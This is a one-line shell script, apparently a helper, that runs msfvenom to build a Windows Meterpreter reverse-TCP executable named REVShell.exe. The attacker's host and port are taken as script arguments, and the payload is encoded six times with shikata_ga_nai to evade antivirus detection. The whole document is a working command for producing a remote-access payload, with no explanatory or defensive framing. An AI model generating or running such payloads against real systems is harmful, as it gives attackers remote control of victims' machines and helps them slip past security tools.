msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -e x86/shikata_ga_nai -i 6 -a x86 --platform windows -b "\x00" -f exe -o REVShell.exe

